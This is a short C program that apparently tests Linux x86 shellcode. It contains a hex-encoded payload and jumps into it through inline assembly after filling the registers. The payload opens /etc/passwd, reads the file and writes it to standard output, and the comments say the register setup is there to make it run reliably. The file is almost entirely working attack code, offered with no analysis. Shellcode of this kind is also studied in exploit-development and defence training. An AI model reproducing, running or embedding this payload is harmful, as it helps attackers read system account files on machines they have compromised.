#include <stdio.h>
#include <string.h>

unsigned char shellcode[] = \

              "\x31\xc9\xf7\xe1\xb0\x05\x51\x68\x73\x73"
              "\x77\x64\x68\x63\x2f\x70\x61\x68\x2f\x2f"
              "\x65\x74\x89\xe3\xcd\x80\x93\x91\xb0\x03"
              "\x31\xd2\x66\xba\xff\x0f\x42\xcd\x80\x92"
              "\x31\xc0\xb0\x04\xb3\x01\xcd\x80\x93\xcd"
              "\x80";


main ()
{

    // When contains null bytes, printf will show a wrong shellcode length.

    printf("Shellcode Length:  %d\n", strlen(shellcode));

    // Pollutes all registers ensuring that the shellcode runs in any circumstance.

    __asm__ ("movl $0xffffffff, %eax\n\t"
            "movl %eax, %ebx\n\t"
            "movl %eax, %ecx\n\t"
            "movl %eax, %edx\n\t"
            "movl %eax, %esi\n\t"
            "movl %eax, %edi\n\t"
            "movl %eax, %ebp\n\t"

            // Calling the shellcode
            "call shellcode");

}